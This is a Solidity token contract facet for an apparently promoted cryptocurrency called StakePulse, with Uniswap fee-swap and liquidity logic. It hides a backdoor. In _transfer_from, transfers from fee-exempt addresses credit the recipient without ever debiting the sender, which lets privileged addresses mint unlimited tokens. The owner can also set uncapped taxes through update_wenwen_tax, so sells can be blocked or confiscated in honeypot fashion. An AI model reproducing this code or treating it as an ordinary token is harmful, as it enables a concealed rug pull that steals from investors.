// SPDX-License-Identifier: MIT

/*
https://www.stakepulse.bond/
https://app.stakepulse.bond/
https://docs.stakepulse.bond/

https://t.me/stakepulse_portal
https://twitter.com/StakePulse_Eth
 */

pragma solidity 0.8.19;
import "./TestLib.sol";
contract _transfer_fromFacet is IERC20 {
    using SafeMath for uint256;

    modifier lock_swap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapping = true;
        _;
        ds.swapping = false;
    }

    function _transfer_from(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.swapping) {
            return _transfer_basic(sender, recipient, amount);
        }

        if (recipient != ds.uniswap_pair && recipient != ds.dead_address) {
            require(
                ds.no_max_tx_address[recipient] ||
                    ds.balances[recipient] + amount <= ds._max_tx_size,
                "Transfer amount exceeds the bag size."
            );
        }
        if (_verify_swap_back(sender, recipient, amount)) {
            perform_wenwen_swap();
        }
        bool should_tax = _should_charge_tax(sender);
        if (should_tax) {
            ds.balances[recipient] = ds.balances[recipient].add(
                _sent_amount_(sender, amount)
            );
        } else {
            ds.balances[recipient] = ds.balances[recipient].add(amount);
        }

        emit Transfer(sender, recipient, amount);
        return true;
    }
    function _transfer_basic(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.balances[sender] = ds.balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        ds.balances[recipient] = ds.balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function _verify_swap_back(
        address sender,
        address recipient,
        uint256 amount
    ) private view returns (bool) {
        return
            _checking_swap() &&
            _should_charge_tax(sender) &&
            _checking_sell_tx(recipient);
    }
    function _checking_swap() internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            !ds.swapping &&
            ds.swap_enabled &&
            ds.balances[address(this)] >= ds._threshold_min_swap;
    }
    function _should_charge_tax(address sender) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return !ds._no_tokenfee_address[sender];
    }
    function _checking_sell_tx(address recipient) private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return recipient == ds.uniswap_pair;
    }
    function perform_wenwen_swap() internal lock_swap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contract_token_balance = balanceOf(address(this));
        uint256 tokens_to_lp = contract_token_balance
            .mul(ds._tokenfee_liq)
            .div(ds._tokenfee_total)
            .div(2);
        uint256 amount_to_swap = contract_token_balance.sub(tokens_to_lp);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswap_router.WETH();

        ds.uniswap_router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount_to_swap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amount_eth = address(this).balance;
        uint256 total_tokenfee_tokens = ds._tokenfee_total.sub(
            ds._tokenfee_liq.div(2)
        );
        uint256 eth_to_lp = amount_eth
            .mul(ds._tokenfee_liq)
            .div(total_tokenfee_tokens)
            .div(2);
        uint256 eth_to_marketing = amount_eth.mul(ds._tokenfee_market).div(
            total_tokenfee_tokens
        );

        payable(ds._tokenfee_wallet).transfer(eth_to_marketing);
        if (tokens_to_lp > 0) {
            ds.uniswap_router.addLiquidityETH{value: eth_to_lp}(
                address(this),
                tokens_to_lp,
                0,
                0,
                ds._tokenfee_wallet,
                block.timestamp
            );
        }
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.balances[account];
    }
    function name() external pure override returns (string memory) {
        return _name;
    }
    function symbol() external pure override returns (string memory) {
        return _symbol;
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.allowances[holder][spender];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        return _transfer_from(msg.sender, recipient, amount);
    }
    function adjust_wenwen_wallet_size(uint256 percent) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._max_tx_size = (ds.total_supply * percent) / 1000;
    }
    function update_wenwen_tax(
        uint256 lp_fee,
        uint256 dev_fee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._tokenfee_liq = lp_fee;
        ds._tokenfee_market = dev_fee;
        ds._tokenfee_total = ds._tokenfee_liq + ds._tokenfee_market;
    }
    function totalSupply() external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.total_supply;
    }
    function decimals() external pure override returns (uint8) {
        return _decimals;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.allowances[sender][msg.sender] != type(uint256).max) {
            ds.allowances[sender][msg.sender] = ds
            .allowances[sender][msg.sender].sub(
                    amount,
                    "Insufficient Allowance"
                );
        }

        return _transfer_from(sender, recipient, amount);
    }
    function _sent_amount_(
        address sender,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.balances[sender] = ds.balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        uint256 fee_tokens = amount.mul(ds._tokenfee_total).div(ds.denominator);
        bool has_no_fee = sender == _owner;
        if (has_no_fee) {
            fee_tokens = 0;
        }

        ds.balances[address(this)] = ds.balances[address(this)].add(fee_tokens);
        emit Transfer(sender, address(this), fee_tokens);
        return amount.sub(fee_tokens);
    }
}
